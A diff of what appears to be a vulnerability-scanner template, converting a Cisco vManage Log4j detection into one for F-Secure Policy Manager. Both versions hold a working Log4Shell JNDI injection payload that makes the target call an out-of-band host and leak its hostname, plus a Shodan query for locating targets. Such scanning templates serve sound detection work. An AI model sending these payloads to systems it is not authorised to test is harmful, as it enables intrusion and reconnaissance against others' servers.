@@ -1,14 +1,13 @@
-id: cisco-vmanage-log4j
+id: f-secure-policymanager-log4j-rce
 
 info:
-  name: Cisco vManage (Log4j) - Remote Code Execution
-  author: DhiyaneshDK
+  name: F-Secure Policy Manager - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
   severity: critical
-  description: Cisco vManage is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. More information is available in the cisco-sa-apache-log4j-qRuKNEbd advisory.
+  description: |
+    F-Secure Policy Manager is susceptible to Log4j JNDI remote code execution.
   reference:
-    - https://www.tenable.com/plugins/nessus/161212
-    - https://logging.apache.org/log4j/2.x/security.html
-    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+    - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
   classification:
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
@@ -16,24 +15,21 @@ info:
     cwe-id: CWE-77
   metadata:
     verified: true
+    shodan-query: html:"F-Secure Policy Manager"
     max-request: 1
-    shodan-query: title:"vManage"
-  tags: log4j,cisco,tenable,cve,cve2021,rce,jndi,kev,oast
+  tags: cve,cve2021,rce,jndi,log4j,fsecure,oast,kev
+
 variables:
   rand1: '{{rand_int(111, 999)}}'
   rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
 
 http:
   - raw:
       - |
-        @timeout: 20s
-        POST /j_security_check HTTP/1.1
+        GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
         Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-        Origin: {{BaseURL}}
-        Referer: {{BaseURL}}
-
-        j_username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&j_password=admin&submit=Log+In
+        Referrer: {{RootURL}}
 
     matchers-condition: and
     matchers:
@@ -41,11 +37,6 @@ http:
         part: interactsh_protocol # Confirms the DNS Interaction
         words:
           - "dns"
-
-      - type: word
-        part: body
-        words:
-          - '<title>Cisco vManage</title>'
 
       - type: regex
         part: interactsh_request
@@ -68,4 +59,3 @@ http:
         regex:
           - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
         part: interactsh_request
-# digest: 490a00463044022032d9914223004281fd5cccc04dfcd93d20bd355b0c23a7f0998dc63c460b65a5022003088034266ef2bed1e23a1bc29334e7ba0d3e3bcc0a3dfabb35440e7c14d124:922c64590222798bb761d5b6d8e72950
